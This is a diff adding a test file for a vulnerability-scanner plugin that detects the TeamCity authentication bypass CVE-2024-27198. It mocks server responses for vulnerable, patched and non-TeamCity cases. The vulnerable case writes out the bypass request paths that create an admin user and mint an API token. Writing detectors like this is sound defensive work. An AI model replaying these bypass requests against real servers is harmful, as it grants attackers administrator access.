@@ -1,0 +1,75 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "JetBrainsTeamCity_CVE_2024_27198"
+}
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/login.html"
+        status: 200
+        body_content: '<title>Log in to TeamCity &mdash; TeamCity</title>'
+      },
+      {
+        uri: "/hax?jsp=/app/rest/users;.jsp"
+        status: 200
+        body_content: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="tsunamitest" id="4" email="tsunami@tsunami.com" href="/app/rest/users/id:4"><properties count="3" href="/app/rest/users/id:4/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="tsunamitest"/><property name="teamcity.server.buildNumber" value="147512"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:4/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>'
+      },
+      {
+        uri: "/hax?jsp=/app/rest/users/id:4/tokens/testtoken;.jsp"
+        status: 200
+        body_content: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="testtoken" creationTime="2025-10-09T22:23:56.609Z" value="eyJ0eXAiOiAiVENWMiJ9.LVQ4eGpuS3RuZzdJVHNnV181eDk0cEpKYzlJ.OGQ1NGI4OGMtOGMwNS00MWM4LWFiMzQtNmFlYmMwMDk3NWEz"/>'
+      },
+      {
+        uri: "/app/rest/users"
+        status: 200
+        body_content: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><users count="2"><user username="admin" id="1" href="/app/rest/users/id:1"/><user username="tsunamitest" id="4" href="/app/rest/users/id:4"/></users>'
+      },
+      {
+        uri: "/app/rest/users/id:4"
+        status: 204
+        body_content : ''
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotVulnerable_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/login.html"
+        status: 200
+        body_content: "<!DOCTYPE html>\r\n    <html lang=\"en\">\r\n    \r\n    <head>\r\n      <title>Log in to TeamCity; TeamCity</title>"
+      },
+      {
+        uri: "/hax?jsp=/app/rest/users;.jsp"
+        status: 403
+        body_content: "Access denied"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotTeamCity_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
